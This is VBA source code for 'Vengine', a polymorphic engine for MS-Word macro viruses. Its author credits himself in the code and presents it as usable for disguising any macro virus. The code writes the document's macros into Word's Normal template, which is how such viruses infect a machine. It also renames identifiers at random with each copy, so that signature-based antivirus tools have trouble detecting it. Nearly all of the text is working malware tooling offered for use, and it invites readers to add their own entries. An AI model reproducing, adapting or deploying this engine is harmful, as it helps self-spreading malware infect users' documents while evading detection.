' Vengine - polymorphizer for MS-Word macro viruses
' Coded by VeggieTailz
'
' This engine can be used to polymorphize any MS-Word macro virus.
'
' The Vengine concept was inspired by Nick FitzGerald's asinine posting
' on BugTraq, dated 3/29/99 and archived at geek-girl.com.
'
Private Zy7td() As String
Private QC2cz() As String
Private K1j() As String
Private Nv4cl As String
Private Sub Example()
  ' As a demo, we'll copy the current macros to the template.  After running
  ' this example (make sure this is the ActiveDocument!), examine the MS-Word
  ' template.  It will contain a scrambled (but still functional) version of
  ' this program.
  Set Source = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set Dest = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  
  ' The "Infect" sub copies the macros from "Source" to "Dest", scrambling
  ' them in the process.  The contents of Dest are overwritten.
  Infect Source, Dest
End Sub
Private Sub InfectTable()
  ' This table stores the identifiers which will be scrambled.  They can
  ' be any ordinary variable name (even names ending with a suffix like
  ' % or $).  Make your choices carefully tho, as the substitutions
  ' will also be applied to string constants (otherwise the code below
  ' would not get updated).
  ReDim QC2cz(29)  ' don't forget to set the array size!
  QC2cz(1) = "Infect"
  QC2cz(2) = "InfectTable"
  QC2cz(3) = "Zy7td"
  QC2cz(4) = "QC2cz"
  QC2cz(5) = "K1j"
  QC2cz(6) = "Nv4cl"
  QC2cz(7) = "Co6q"
  QC2cz(8) = "X3X"
  QC2cz(9) = "R0e"
  QC2cz(10) = "Tq4tl"
  QC2cz(11) = "G4u"
  QC2cz(12) = "To6dm"
  QC2cz(13) = "Rg4mp"
  QC2cz(14) = "I4h"
  QC2cz(15) = "I6w"
  QC2cz(16) = "Gy0u"
  QC2cz(17) = "S5l"
  QC2cz(18) = "T1g"
  QC2cz(19) = "T1b"
  QC2cz(20) = "Ba6Dk%"
  QC2cz(21) = "X1U%"
  QC2cz(22) = "C6E%"
  QC2cz(23) = "C6z%"
  QC2cz(24) = "X6q"
  QC2cz(25) = "XM2wj"
  QC2cz(26) = "Yx1h"
  QC2cz(27) = "Sh6k"
  QC2cz(28) = "T2w"
  QC2cz(29) = "Ky8c"
  ' [add your entries here!]
End Sub
Private Sub Infect(Co6q, X3X)
ReDim Zy7td(0)
ReDim QC2cz(0)
ReDim K1j(0)
Dim R0e As String
For I = 1 To Co6q.CountOfLines
R0e = Co6q.Lines(I, 1)
If Trim(R0e) <> "" Then T2w R0e, 1
Next I
Tq4tl
X3X.DeleteLines 1, X3X.CountOfLines
X3X.AddFromString ""
For I = 1 To Co6q.CountOfLines
R0e = Co6q.Lines(I, 1)
If Trim(R0e) <> "" Then
Nv4cl = ""
T2w R0e, 2
If Rnd < 0.1 Then Nv4cl = Nv4cl + " ' " + "T1b"
X3X.InsertLines X3X.CountOfLines + 1, Nv4cl
End If
Next I
End Sub
Private Sub Sh6k(To6dm As String, Rg4mp As Integer)
G4u = Left$(To6dm, 1) = Chr$(34) And Right$(To6dm, 1) = Chr$(34) And Len(To6dm) > 2
If G4u Then To6dm = Mid$(To6dm, 2, Len(To6dm) - 2)
I4h = UCase$(Left$(To6dm, 1)) >= "A" And UCase$(Left$(To6dm, 1)) <= "Z"
Ky8c = UCase$(Right$(To6dm, 1))
If Rg4mp = 1 Then
If I4h Then
For Ba6Dk% = 1 To UBound(Zy7td)
If To6dm = Zy7td(Ba6Dk%) Then Exit Sub
Next Ba6Dk%
ReDim Preserve Zy7td(UBound(Zy7td) + 1)
Zy7td(UBound(Zy7td)) = To6dm
End If
Exit Sub
End If
If I4h Then
For Ba6Dk% = 1 To UBound(QC2cz)
If To6dm = QC2cz(Ba6Dk%) Then
To6dm = K1j(Ba6Dk%)
If Ky8c < "A" Or Ky8c > "Z" Then To6dm = To6dm + Ky8c
Exit For
End If
Next Ba6Dk%
End If
If G4u Then To6dm = Chr$(34) + To6dm + Chr$(34)
If Nv4cl <> "" Then
If Right$(Nv4cl, 1) <> "." And Left$(To6dm, 1) <> "." Then To6dm = " " + To6dm
End If
Nv4cl = Nv4cl + To6dm
End Sub
Private Sub Tq4tl()
InfectTable
ReDim Preserve K1j(UBound(QC2cz))
For Ba6Dk% = 1 To UBound(K1j)
I6w:
Gy0u = Int(Rnd * 3) + 3
S5l = ""
For X1U% = 1 To Gy0u
T1g = Chr$(97 + Int(Rnd * 26))
If X1U% = 1 Or Rnd > 0.8 Then T1g = UCase$(T1g)
If X1U% = 1 + Int(Gy0u / 2) Then T1g = Chr$(48 + Rnd * 9)
S5l = S5l + T1g
Next X1U%
For X1U% = 1 To UBound(Zy7td)
If S5l = Zy7td(X1U%) Then GoTo I6w
Next X1U%
For X1U% = 1 To Ba6Dk% - 1
If S5l = K1j(X1U%) Then GoTo I6w
Next X1U%
K1j(Ba6Dk%) = S5l
Next Ba6Dk%
End Sub
Private Sub T2w(R0e As String, Rg4mp As Integer)
Dim To6dm As String
Dim T1g As String
Do
R0e = LTrim(R0e)
XM2wj = False
If Len(R0e) = 0 Then Exit Do
C6E% = 1
T1g = UCase$(Left$(R0e, 1))
X6q = (T1g >= "A" And T1g <= "Z") Or (T1g >= "0" And T1g <= "9")
Do
If C6E% > Len(R0e) Then Exit Do
T1g = Mid$(R0e, C6E%, 1)
If T1g = Chr$(34) Then
If XM2wj Then C6E% = C6E% + 1: Exit Do
XM2wj = True
End If
If Not XM2wj Then
If X6q Then
If T1g = "$" Or T1g = "%" Or T1g = "&" Then C6E% = C6E% + 1: Exit Do
If T1g = "!" Or T1g = "#" Then C6E% = C6E% + 1: Exit Do
End If
Yx1h = UCase$(T1g) >= "A" And UCase$(T1g) <= "Z"
Yx1h = Yx1h Or (T1g >= "0" And T1g <= "9") Or T1g = "_"
If X6q <> Yx1h Then Exit Do
If T1g < Chr$(33) Or T1g > Chr$(127) Then Exit Do
End If
C6E% = C6E% + 1
Loop
To6dm = Left$(R0e, C6E% - 1)
R0e = Right$(R0e, Len(R0e) - (C6E% - 1))
If Left$(To6dm, 1) = "'" Or To6dm = "Rem" Then Exit Do
Sh6k To6dm, Rg4mp
Loop
End Sub


